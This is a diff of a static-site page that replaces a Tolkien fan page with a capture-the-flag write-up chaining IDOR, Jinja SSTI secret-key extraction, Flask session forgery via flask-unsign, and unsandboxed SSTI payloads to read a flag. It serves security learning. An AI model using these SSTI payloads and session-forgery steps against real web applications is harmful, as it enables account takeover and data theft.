@@ -3,14 +3,22 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Tolkien Fan Club</title>
+    <title>WRITE UP: The Memories [IDOR → SSTI → Session Forgery → Admin → Flag]</title>
     <link href="/MarkForge/index.css" rel="stylesheet" />
   </head>
 
   <body>
-    <article><div><h1>Tolkien Fan Club</h1><p><img src="/MarkForge/images/tolkien.png" alt="JRR Tolkien sitting"></img></p><p>Here's the deal, <b>I like Tolkien</b>.</p><blockquote>"I am in fact a Hobbit in all but size."  -- J.R.R. Tolkien</blockquote><h2>Blog posts</h2><ul><li><a href="/MarkForge/blog/glorfindel">Why Glorfindel is More Impressive than Legolas</a></li><li><a href="/MarkForge/blog/tom">Why Tom Bombadil Was a Mistake</a></li><li><a href="/MarkForge/blog/majesty">The Unparalleled Majesty of "The Lord of the Rings"</a></li></ul><h2>Reasons I like Tolkien</h2><ul><li>You can spend years studying the legendarium and still not understand its depths</li><li>It can be enjoyed by children and adults alike</li><li>Disney <i>didn't ruin it</i> (okay, but Amazon might have)</li><li>It created an entirely new genre of fantasy</li></ul><h2>My favorite characters (in order)</h2><ol><li>Gandalf</li><li>Bilbo</li><li>Sam</li><li>Glorfindel</li><li>Galadriel</li><li>Elrond</li><li>Thorin</li><li>Sauron</li><li>Aragorn</li></ol><p>Here's what <code>elflang</code> looks like (the perfect coding language):</p><pre><code>func main(){
-    fmt.Println("Aiya, Ambar!")
-}
-</code></pre><p>Want to get in touch? <a href="/MarkForge/contact">Contact me here</a>.</p><p>This site was generated with a custom-built <a href="https://www.boot.dev/courses/build-static-site-generator-python">static site generator</a> from the course on <a href="https://www.boot.dev">Boot.dev</a>.</p></div></article>
+    <article><div><h1>WRITE UP: The Memories [IDOR → SSTI → Session Forgery → Admin → Flag]</h1><ul><li>NOTE : Hints are not a part of write-up.</li></ul><h2>Overview</h2><p>This challenge demonstrates a multi-step exploitation chain combining:</p><ul><li>Credential leakage</li><li>IDOR (Insecure Direct Object Reference)</li><li>SSTI (Server-Side Template Injection)</li><li>Flask session forgery</li><li>SSTI (Server-Side Template Injection)</li></ul><p>Goal: escalate from a low-privileged user (<code>student_7</code>) to <code>rangrez_admin</code> and extract the flag.</p><h2>Recon</h2><p>- Checked page source and <code>/static/robots.txt</code> - Found credentials:   <code>   username: student_7   password: holi123   </code></p><h2>Login</h2><p>Login as <code>student_7</code> to gain access to user-controlled memory.</p><h2>IDOR</h2><p>Access hidden memory:</p><pre><code>/memory/13
+</code></pre><ul><li>Owned by <code>rangrez_admin</code></li><li>Not visible but accessible via direct reference</li></ul><h2>SSTI Discovery</h2><ul><li>Application renders user-controlled input via Jinja</li><li><code>student_x</code> users → <code>SandboxedEnvironment</code> (The CTF was set in order to restrict direct flag discovery without session forgery).</li><li><code>rangrez_admin</code> → full <code>Environment</code> (no sandbox)</li></ul><h2>Secret Key Extraction</h2><p>From SSTI:</p><pre><code>{{ config['SECRET_KEY'] }}
+app.secret_key = "r4ngr3z-arch1v3-k3y-2026"
+</code></pre><h2>Session Forgery</h2><p>Forge cookie:</p><pre><code>son
+flask-unsign --sign --cookie '{"user": "rangrez_admin", "overrides": {} }' --secret 'r4ngr3z-arch1v3-k3y-2026'
+{"user":"rangrez_admin","overrides":{}}
+</code></pre><p>Sign using the secret key and replace browser cookie.</p><h2>Admin Access</h2><p>Now running in <b>unsandboxed Jinja environment</b>.</p><h2>Final SSTI Payloads</h2><h3>Payloads</h3><pre><code>inja2
+{{ self.__init__.__globals__['FLAG'] }}
+</code></pre><pre><code>inja2
+{{ self.__dict__._TemplateReference__context.get('FLAG') }}
+</code></pre><h2>Flag</h2><pre><code>TCHNVTE{1d0r_plus_sst1_rang_d3_d1y4}
+</code></pre></div></article>
   </body>
 </html>
